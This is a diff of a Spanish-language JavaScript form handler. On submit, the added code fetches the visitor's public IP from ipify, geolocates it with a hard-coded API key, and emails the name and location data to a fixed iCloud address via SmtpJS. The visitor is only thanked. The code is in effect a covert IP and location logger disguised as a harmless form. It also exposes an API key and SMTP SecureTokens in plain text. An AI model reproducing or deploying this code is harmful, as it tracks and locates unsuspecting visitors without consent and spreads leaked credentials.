@@ -5,8 +5,25 @@ async function get() {
     event.preventDefault();
     const nombre = document.querySelector('#nombre').value;
 
+    const json1 = await fetch("https://api.ipify.org?format=json")
+    .then(response => {
+        // Verificar si la respuesta es exitosa (estado 200)
+        if (!response.ok) {
+          throw new Error('Hubo un problema con la solicitud.');
+        }
+        // Parsear la respuesta como JSON y devolverla
+        return response.json();
+      })
+      .then(data => {
+        // Hacer algo con los datos
+        console.log(data);
+        // Acceder al valor específico 'ip'
+        console.log(data.ip);
+        ip2 = data.ip
+      })
+
     try {
-        let string = "https://cors-anywhere.herokuapp.com/http://geo.ipify.org/api/v1?apiKey=at_RnctMsOMzeO7C8UU1BPrIdrcLjBXW";
+        let string = "https://cors-anywhere.herokuapp.com/http://geo.ipify.org/api/v1?apiKey=at_RnctMsOMzeO7C8UU1BPrIdrcLjBXW&ipAddress="+ip2+"";
         console.log(string);
 
         const response = await fetch(string);
@@ -17,21 +34,18 @@ async function get() {
         }
         
         const data = await response.json(); // Obtener los datos JSON
-        
+        console.log(data)
         // Configurar el objeto de correo electrónico
-        const emailConfig = {
-            SecureToken: "9f000ead-c1a3-4f50-b67e-4957363f3f96",
-            To: 'ensenadas-voces.0l@icloud.com',
-            From: "ensenadas-voces.0l@icloud.com",
-            Subject: nombre,
-            Body: JSON.stringify(data) // Convertir los datos en una cadena JSON
-        };
-
-        // Enviar el correo electrónico
-        const message = await Email.send(emailConfig);
-        console.log(message);
-
-        alert("¡Muchas Gracias!");
+        Email.send({
+            SecureToken : "10a1f2e8-7cb9-412e-9a00-0dc84a0cb037",
+            To : 'ensenadas-voces.0l@icloud.com',
+            From : "ensenadas-voces.0l@icloud.com",
+            Subject : nombre,
+            Body : data,
+        }).then(
+        message => console.log(message)
+        );
+        alert("Muchas Gracias");
     } catch (error) {
         console.error('Error:', error);
         alert("Ocurrió un error al procesar tu solicitud.");
